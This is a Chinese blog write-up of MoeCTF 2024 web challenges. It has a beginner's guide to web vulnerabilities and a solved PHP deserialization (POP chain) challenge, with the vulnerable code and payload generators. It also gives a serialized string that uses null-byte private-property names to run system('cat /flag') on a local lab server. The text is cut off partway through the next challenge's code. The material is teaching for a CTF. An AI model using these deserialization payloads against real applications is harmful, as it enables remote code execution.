@@ -1,0 +1,742 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/dong.github/img/youtiao.png">
+  <link rel="icon" href="/dong.github/img/youtiao.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="Dong">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="2024MoeCTF小结，挑一些题记下笔记">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Moe2024">
+<meta property="og:url" content="https://cmoments.github.io/dong.github/2024/09/13/Moe2024/index.html">
+<meta property="og:site_name" content="江安老油条">
+<meta property="og:description" content="2024MoeCTF小结，挑一些题记下笔记">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cmoments.github.io/dong.github/images/0914.png">
+<meta property="og:image" content="https://cmoments.github.io/dong.github/images/0914-1.png">
+<meta property="article:published_time" content="2024-09-13T15:12:33.000Z">
+<meta property="article:modified_time" content="2024-09-13T16:25:05.371Z">
+<meta property="article:author" content="Dong">
+<meta property="article:tag" content="Web">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cmoments.github.io/dong.github/images/0914.png">
+  
+  
+  
+  <title>Moe2024 - 江安老油条</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/KaTeX/0.16.2/katex.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/dong.github/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/dong.github/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/dong.github/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"cmoments.github.io","root":"/dong.github/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/dong.github/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/dong.github/js/utils.js" ></script>
+  <script  src="/dong.github/js/color-schema.js" ></script>
+  
+
+
+  
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/dong.github/">
+      <strong>江安老油条</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/dong.github/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/dong.github/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>回忆</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/dong.github/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/dong.github/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/dong.github/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/dong.github/img/banner-1.webp') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Moe2024"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2024-09-13 23:12" pubdate>
+          September 13, 2024 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          2.1k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          18 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Moe2024</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p><strong>2024MoeCTF小结，挑一些题记下笔记</strong></p>
+<span id="more"></span>
+<h1 id="Web渗透测试与审计入门指北"><a href="#Web渗透测试与审计入门指北" class="headerlink" title="Web渗透测试与审计入门指北"></a>Web渗透测试与审计入门指北</h1>
+    <div class="fold">
+      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-cff048a9" role="button" aria-expanded="false" aria-controls="collapse-cff048a9">
+        <div class="fold-arrow">▶</div>入门指北
+      </div>
+      <div class="fold-collapse collapse" id="collapse-cff048a9">
+        <div class="fold-content">
+          <h1 id="moectf2024-web入门指北"><a href="#moectf2024-web入门指北" class="headerlink" title="moectf2024 web入门指北"></a>moectf2024 web入门指北</h1><p>xt</p><h2 id="一-web是啥"><a href="#一-web是啥" class="headerlink" title="一.web是啥"></a>一.web是啥</h2><p>互联网时代，web应用以及涉及到生活中的方方面面，与后端交互的软件呀，浏览器看到的web<br>网页呀。ctf中web一般涉及web网页安全，通过利用网页前后端的漏洞（代码漏洞也好，服务器<br>漏洞也好）获取关键数据flag，一上来首先需要大家自己搭建一个基本的网站，了解网站的基本<br>架构，连网站是怎么运行的都不知道何谈找漏洞呢。</p><h2 id="二-学习方法"><a href="#二-学习方法" class="headerlink" title="二.学习方法"></a>二.学习方法</h2><p>不懂就搜（善用ai和搜索引擎，小到软件怎么使用，大到某一个庞大的知识点，可以使用多个搜<br>索引擎，推荐google和<a href="http://www.bing），不懂就问（大雪参必备技能---脸皮厚），推荐blog网站：">www.bing），不懂就问（大雪参必备技能---脸皮厚），推荐blog网站：</a><br>先知社区，freebuf</p><h2 id="三-学习路线"><a href="#三-学习路线" class="headerlink" title="三.学习路线"></a>三.学习路线</h2><p>配置环境(最难最烦):你可以去搜教程看文档，在配置期间你可能会<br>遇到各种各种看不懂得错误，要有耐心，环境需要边学边配置，这里<br>简单列举好用的<br>1.linux操作系统需要学习（先学会简单使用shell）使用vm虚拟机装个linux发行版吧，用多了相<br>信你会喜欢linux<br>2.浏览器及其插件（hackbar，ProxySwitchyOmega，Wappalyzer）<br>3.常用工具（BurpSuite，PHPStudy，Antsword，dirsearch）安装使用想必你会自己搜叭<br>4.杂七杂八（clash，uTools，Everything）还有一些常用的网站（fofa,cmd5,站长之家）等等<br>路线指南：<br>基础知识：（目标搭建自己的第一个网站）<br>1.基本的网络协议（重点http）http的请求头请求体请求方法<br>2.编码与加解密知识，经典的base64，hash等等，需要一点基本的密码知识<br>可供参考的资料：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/ruoli-s/p/14206145.html">https://www.cnblogs.com/ruoli-s/p/14206145.html</a><br>3.认证方法（cookie，session，jwt）<br>4.前端三要素（html，css，javascript）css知道就好，粗体为重点<br>5.后端（先从最简单的php开始）开发简单动态网站（使用phpstudy或者手动安装lamp）<br>6.数据库（先简单学习Mysql）能实现增删改查<br>7.一个趁手的脚本语言（推荐python）能够实现简单爬虫7.学会使用重要的工具，刚开始不用陷<br>入学工具，简单学会使用burpsuite就行<br>信息搜集：<br>知道一个网站是什么框架等等<br>初探漏洞：<br>web漏洞多到数不清，先从top10学起，以下只给部分介绍，可以从php语言来看这些漏洞是如<br>何产生的，又怎样修补避免呢，攻击时怎么绕过某些阻碍</p><h3 id="1-sql注入"><a href="#1-sql注入" class="headerlink" title="1.sql注入"></a>1.sql注入</h3><p>就是拼接sql语句实现读取数据库信息（信息泄露），篡改，甚至删除数据库信息，有多种注入方<br>式和利用技巧，注入类的漏洞很多但都大差不差，sql注入算是经典中的经典，学习的时候不要只<br>看不操作，可以找靶场玩玩<br>推荐靶场：sql-libs</p><h3 id="2-php的安全问题"><a href="#2-php的安全问题" class="headerlink" title="2.php的安全问题"></a>2.php的安全问题</h3><p>php使用不当会容易出现很多漏洞，&#x3D;&#x3D;，&#x3D;&#x3D;&#x3D;使用不当导致php弱类型呀啥的，而且php语言太<br>灵活容易被利用<br>文件包含，主要由函数include()，require()，include_once()，require_once()造成他们包含的<br>文件会被解析成php代码执行<br>变量覆盖，关键变量能被用户控制从而导致问题<br>远程代码执行（rce），比如eval()中的代码能够让用户控制（eval($_POST[‘code’]);）<br>等等种种</p><h3 id="3-前端安全（xss-csrf等等）"><a href="#3-前端安全（xss-csrf等等）" class="headerlink" title="3.前端安全（xss, csrf等等）"></a>3.前端安全（xss, csrf等等）</h3><p>由前端造成的漏洞<br>xss：用户通过html注入篡改网页前端，一般插入javascript使得别人访问时自动运行，比如评论<br>区啥的很多很多甚至用户名都行，只要没啥过滤，都可以让浏览器渲染执行，ctf中主要是窃取<br>cookie<br>推荐靶场：xss-libs<br>Csrf: 攻击者可以使得受害者发送http的请求（如果受害者的token没过期的话，嘿嘿）</p><h3 id="4-服务端请求伪造-ssrf"><a href="#4-服务端请求伪造-ssrf" class="headerlink" title="4.服务端请求伪造(ssrf)"></a>4.服务端请求伪造(ssrf)</h3><p>用户能使服务器发送http请求，一般我们是向服务器发请求，而ssrf是使得服务器计算机发出<br>http请求</p><h3 id="5-文件上传"><a href="#5-文件上传" class="headerlink" title="5.文件上传"></a>5.文件上传</h3><p>用户在上传文件功能的地方（头像呀什么的）上传可执行脚本获得shell（php一句话木马），在<br>服务器可以执行有害命令</p><h3 id="6-其他"><a href="#6-其他" class="headerlink" title="6.其他"></a>6.其他</h3><p>各种语言的反序列化，nodejs原型链污染， ssti，xxe，各种cms，组件漏洞啥的</p><h2 id="四-练习"><a href="#四-练习" class="headerlink" title="四.练习"></a>四.练习</h2><p>靶场推荐<br>攻防世界（有入门靶场）<br>Bugku<br>Buuctf<br>ctfhub<br>Nssctf<br>不会可以查看wp,一定搞清楚原理,可以学完一个漏洞就找相同类型的靶场打一打（瞎jb乱打不是<br>很建议）<br>最后建议多看书多看博客社区多了解，祝大家可以在ctf中玩的开心</p>
+        </div>
+      </div>
+    </div>
+
+<h1 id="Pop-base-mini-moe"><a href="#Pop-base-mini-moe" class="headerlink" title="Pop base mini moe"></a>Pop base mini moe</h1><h3 id="protected和public修饰的属性在序列化中是有区别的"><a href="#protected和public修饰的属性在序列化中是有区别的" class="headerlink" title="protected和public修饰的属性在序列化中是有区别的"></a>protected和public修饰的属性在序列化中是有区别的</h3><h3 id="在实例中无法通过-obj-属性名-或方法名-来调用pravite类型的方法或属性"><a href="#在实例中无法通过-obj-属性名-或方法名-来调用pravite类型的方法或属性" class="headerlink" title="在实例中无法通过$obj-&gt;属性名(或方法名) 来调用pravite类型的方法或属性"></a>在实例中无法通过$obj-&gt;属性名(或方法名) 来调用pravite类型的方法或属性</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//private和public序列化字符串差异</span><br><span class="hljs-comment">///?data=O:1:&quot;A&quot;:2:&#123;s:7:&quot;Aevil&quot;;s:2:&quot;ls&quot;;s:4:&quot;Aa&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;Bb&quot;;s:6:&quot;system&quot;;&#125;&#125;</span><br><span class="hljs-comment">///?data=O:1:&quot;A&quot;:2:&#123;s:4:&quot;evil&quot;;s:2:&quot;ls&quot;;s:1:&quot;a&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;Bb&quot;;s:6:&quot;system&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+
+
+    <div class="fold">
+      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-dcdac752" role="button" aria-expanded="false" aria-controls="collapse-dcdac752">
+        <div class="fold-arrow">▶</div>题目代码
+      </div>
+      <div class="fold-collapse collapse" id="collapse-dcdac752">
+        <div class="fold-content">
+          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-comment">// 注意 private 属性的序列化哦</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$evil</span>;<br><br>    <span class="hljs-comment">// 如何赋值呢</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;a;<br>        <span class="hljs-variable">$s</span>(<span class="hljs-variable language_">$this</span>-&gt;evil);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"><span class="hljs-variable">$c</span></span>) </span>&#123;<br>        <span class="hljs-variable">$s</span> = <span class="hljs-variable language_">$this</span>-&gt;b;<br>        <span class="hljs-variable">$s</span>(<span class="hljs-variable">$c</span>);<br>    &#125;<br>&#125;<br><br><br> <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]))<br> &#123;<br>     <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;data&#x27;</span>]);<br> &#125;<br> <span class="hljs-keyword">else</span> &#123;<br>     <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br> &#125;<br><br></code></pre></td></tr></table></figure>
+        </div>
+      </div>
+    </div>
+
+
+    <div class="fold">
+      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-6ae3e036" role="button" aria-expanded="false" aria-controls="collapse-6ae3e036">
+        <div class="fold-arrow">▶</div>payload1
+      </div>
+      <div class="fold-collapse collapse" id="collapse-6ae3e036">
+        <div class="fold-content">
+          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-comment">// 注意 private 属性的序列化哦</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$evil</span>;<br> <br>    <span class="hljs-comment">// 如何赋值呢</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$a</span>;<br> <br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;evil=<span class="hljs-string">&quot;ls&quot;</span>;<br>    &#125;<br> <br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$b</span>=<span class="hljs-string">&quot;system&quot;</span>;<br> <br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>());<br> <br>http:<span class="hljs-comment">//127.0.0.1:63135/?data=O:1:&quot;A&quot;:2:&#123;s:7:&quot;%00A%00evil&quot;;s:9:&quot;cat /flag&quot;;s:4:&quot;%00A%00a&quot;;O:1:&quot;B&quot;:1:&#123;s:4:&quot;%00B%00b&quot;;s:6:&quot;system&quot;;&#125;&#125;</span><br></code></pre></td></tr></table></figure>
+        </div>
+      </div>
+    </div>
+
+
+    <div class="fold">
+      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-9c51fa20" role="button" aria-expanded="false" aria-controls="collapse-9c51fa20">
+        <div class="fold-arrow">▶</div>payload2
+      </div>
+      <div class="fold-collapse collapse" id="collapse-9c51fa20">
+        <div class="fold-content">
+          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">A</span> </span>&#123;<br>    <span class="hljs-comment">// 注意 private 属性的序列化哦</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$evil</span>;<br><br>    <span class="hljs-comment">// 如何赋值呢</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">B</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;evil = <span class="hljs-string">&#x27;cat /flag&#x27;</span>;<br>        <span class="hljs-comment">// $s($this-&gt;evil);</span><br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">B</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$b</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;b = <span class="hljs-string">&#x27;system&#x27;</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-variable">$object</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">A</span>();<br><span class="hljs-variable">$string</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$object</span>);<br><br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$string</span> ;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;hr&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+        </div>
+      </div>
+    </div>
+<h2 id="Note-低版本的php是可以通过public直接覆盖掉private进行绕过的，我的payload2采用了这种做法。"><a href="#Note-低版本的php是可以通过public直接覆盖掉private进行绕过的，我的payload2采用了这种做法。" class="headerlink" title="Note:低版本的php是可以通过public直接覆盖掉private进行绕过的，我的payload2采用了这种做法。"></a>Note:低版本的php是可以通过public直接覆盖掉private进行绕过的，我的payload2采用了这种做法。</h2><p><strong>原先通过构造函数的方式对private修饰的属性一直过不了，出现的报错是：Uncaught Error: Function name must be a string，根本没有完成赋值，后来终于找到了这个坑点：（引用先知社区）</strong><br><img src="/dong.github/images/0914.png" srcset="/dong.github/img/loading.gif" lazyload><br><strong>会发现在Threezh1的左右，也就是属性名中的类名左右存在两个空字节。所以反序列化不成功的原因就是由于序列化内容生成到网页后，空字节不会一同生成出去，导致反序列化的时候无法识别是private属性，反序列化失败。</strong><br><img src="/dong.github/images/0914-1.png" srcset="/dong.github/img/loading.gif" lazyload><br><strong>那解决这个问题的方法就是，在传递反序列化字符串中，在类名的左右加上%00，也就是空字节对于的URL编码。</strong><br><strong>于是就有了payload1（正解）</strong></p>
+<h1 id="Pop-moe"><a href="#Pop-moe" class="headerlink" title="Pop moe"></a>Pop moe</h1>
+    <div class="fold">
+      <div class="fold-title fold-info collapsed" data-toggle="collapse" href="#collapse-05eef982" role="button" aria-expanded="false" aria-controls="collapse-05eef982">
+        <div class="fold-arrow">▶</div>题目
+      </div>
+      <div class="fold-collapse collapse" id="collapse-05eef982">
+        <div class="fold-content">
+          <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class000</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$payl0ad</span> = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$what</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">check</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;payl0ad === <span class="hljs-number">0</span>)<br>        &#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;FAILED TO ATTACK&#x27;</span>);<br>        &#125;<br>        <span class="hljs-variable">$a</span> = <span class="hljs-variable language_">$this</span>-&gt;what;<br>        <span class="hljs-variable">$a</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class001</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payl0ad</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$a</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__invoke</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;a-&gt;payload = <span class="hljs-variable language_">$this</span>-&gt;payl0ad;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">class002</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$sec</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$a</span>, <span class="hljs-variable">$b</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$b</span>(<span class="hljs-variable language_">$this</span>-&gt;sec);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span 